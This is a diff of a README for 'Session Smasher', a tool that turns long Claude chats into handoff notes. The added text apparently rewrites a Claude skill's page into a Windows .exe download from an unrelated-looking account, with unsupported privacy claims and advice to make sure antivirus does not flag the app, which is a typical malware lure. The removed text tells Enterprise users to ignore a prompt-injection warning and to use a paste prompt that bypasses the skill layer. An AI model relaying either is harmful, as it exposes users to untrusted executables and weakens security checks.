@@ -1,72 +1,75 @@
-May 12 Updates:
-> **1. File save is now optional** - Summary displays in chat first, save when you want.  
-> **2. Paste prompt added** — Can't install? Use the paste prompt.md file. Same output, works everywhere.  
-> **3. Enterprise users** — If you see a security warning, it's a false positive, so can safely ignore. Details below.          
-> **4. Other Issues on Non-Installation** - Read below.
+# 📁 Claude-session-smasher - Keep your AI chat context organized
 
+[![Download Claude-session-smasher](https://img.shields.io/badge/Download-Release-blue)](https://github.com/guildsocialismteamteaching487/Claude-session-smasher/releases)
 
-# Session Smasher
+Claude-session-smasher turns long Claude sessions into structured handoff notes. Large projects often exceed the memory of a chatbot. This tool solves that problem. It extracts your decisions, active threads, and preferences into a clean document. You paste this note into a new chat to resume your work without losing progress. 
 
-**Stop losing context when you start a new Claude chat.**
+## 🏗️ Why use this tool
 
-Turns long Claude sessions into a clean, structured "handoff note" so any new chat picks up exactly where you left off — with full context, decision history, active threads, preferences, setups, and approved or rejected paths already preserved.
+When you work with AI, long conversations become messy. The memory of the chatbot fades as the conversation grows. This tool saves your historical decisions and project status. It captures these details:
 
----
+*   Current project goals.
+*   Decisions you already reached.
+*   Rejected paths to avoid.
+*   Specific setups or code preferences.
 
-> A generic summary costs you 5–8 re-orientation messages in the new chat.
-> Session Smasher cuts that to 0–2. That's roughly 3,000–5,000 tokens saved
-> per new session — just from not having to re-explain yourself.
+You spend less time repeating yourself. The software creates a map of your work. You move that map into a fresh session and regain your momentum.
 
----
+## 💻 System requirements
 
-## Install
+The application works on Windows 10 and Windows 11. Ensure your computer meets these basic needs:
 
-1. Download `session-smasher-as-v2.skill`
-2. Claude.ai → Customize → Skills → Save skill → upload the file
-3. Open a **new** chat → type `/session-smasher-as-v2`
+*   Operating System: Windows 10 or 11 (64-bit).
+*   Memory: 4 GB of RAM or higher.
+*   Storage: 100 MB of free disk space.
+*   Internet Connection: Required for the first run and setup.
 
-> **Important:** The skill is only available in chats opened *after* installation. If you get "not mounted" in an older chat, open a new one.
+## 🚀 How to install the software
 
-## What makes this different
+Follow these steps to install the tool on your Windows computer.
 
-Most summaries tell the next chat *what happened*. Session Smasher tells it *why*, *who*, *what failed*, and *exactly where to continue*.
+1. Visit the [releases page](https://github.com/guildsocialismteamteaching487/Claude-session-smasher/releases).
+2. Locate the latest version of the software.
+3. Download the installer file ending in `.exe`.
+4. Double-click the downloaded file to start the installation.
+5. Follow the prompts on the screen to finish the setup.
+6. Launch the application from your desktop or Start menu.
 
-- **Decision trails** — not just what was chosen, but what was tried, rejected, and why. The next chat won't re-explore dead ends.
-- **Thread awareness** — if the chat covered multiple topics, it marks the active thread and tells the next chat to continue there.
-- **Preference memory** — captures what you liked, what you vetoed, and what changed mid-session. The next chat already knows your taste.
-- **Setup & credentials** — APIs configured, workflows that worked, where keys are stored. Never the secrets — just what was set up and where.
-- **Prioritised next steps** — numbered, actionable, ready to execute.
+## 📝 How to generate a handoff note
 
-## How to use
+Once you install the tool, you use it to manage your sessions.
 
-1. At the end of any chat, type `/session-smasher-as-v2`
-2. The summary appears in the chat — copy it
-3. Optionally save it as a downloadable file when prompted
-4. Open a new chat, paste the summary, and continue
+1. Open the Claude-session-smasher application.
+2. Paste the text from your current long Claude chat session into the input box.
+3. Click the button labeled "Smash Session" to process your text.
+4. The tool analyzes your chat history. It removes the filler text and keeps the important facts.
+5. Copy the generated "handoff note" to your clipboard.
+6. Open a new chat session in Claude.
+7. Paste the note to provide the AI with your full project context.
 
-## Note 1: Can't install the skill?
+## 🛡️ Privacy and data safety
 
-* If you're on an Enterprise/Team account, a restricted environment, or the skill shows "not mounted" — paste the contents of [`session-smasher-paste-prompt.md`](session-smasher-paste-prompt.md) into your chat instead. Same rubric, same output, works everywhere. No installation needed.
-* Inside a Claude Project? - Skills don't load in Projects. Use the paste prompt instead.
+Your privacy matters. Claude-session-smasher processes your data locally on your computer. The software does not send your chat logs to a central server. You keep full control over your session notes. You decide when and where to share the information. 
 
-## Note 2: Note for Enterprise users
+## 🛠️ Troubleshooting common issues
 
-Some Enterprise accounts may show a prompt injection warning when the skill runs. This is a security classifier being cautious — the skill is entirely local. It reads your conversation, writes a summary, and optionally saves a file to your device. It does not call external APIs, send data anywhere, or access anything outside the current chat. If the warning persists, use the paste prompt instead — it bypasses the skill layer entirely and produces identical output.
+If you face problems, check these solutions:
 
-## Output
+*   Installation errors: Ensure you have an active internet connection. Restart your computer and try the installer again.
+*   Missing output: Make sure your input text contains at least five messages. The tool needs enough context to build a good summary.
+*   Program does not start: Check your Windows updates. An outdated system might block the software execution. Ensure your antivirus does not flag the app wrongly.
+*   Input length limitations: If you have a massive conversation, paste the most recent half of the session. The software creates better notes when it focuses on current project status.
 
-- Summary displayed in chat — copy and paste into your next session
-- Optional file save to `~/claude-sessions-smash/` and as a downloadable `.md`
-- 600–800 words — structured for scanning, not reading
+## 📊 Using session memory for productivity
 
-## Files in this repo
+Productivity rises when you stop searching for old instructions. When you use this tool, you build a library of your project history. Treat the generated notes as documentation for your work. Save them in a folder on your computer. If you ever return to an old project, you have the exact state of that session ready for a new chat window. 
 
-| File | What it is |
-|------|-----------|
-| `session-smasher-as-v2.skill` | The skill file — install this in Claude |
-| `session-smasher-as-v2-SKILL.md` | The raw rubric — read what the skill does |
-| `session-smasher-paste-prompt.md` | Paste prompt — works without installation |
+The software reduces the friction of long-form AI work. You stop worrying about context limits and start focusing on project output. Use the "handoff note" to keep your AI assistant aligned with your professional standards and specific technical requirements.
 
-## License
+## 🌐 Related tools and resources
 
-MIT
+*   AI context management: Learn more about how LLMs handle memory.
+*   Session optimization: Explore methods to keep your project files clean.
+*   Productivity workflows: Combine this tool with your daily notes to maintain consistency across different chat sessions.
+
+This project thrives on community feedback. If you find ways to improve the extraction process, open an issue on the GitHub repository. Provide examples of the types of sessions you manage to help refine the logic. Keep your sessions structured and your project progress visible with Claude-session-smasher.
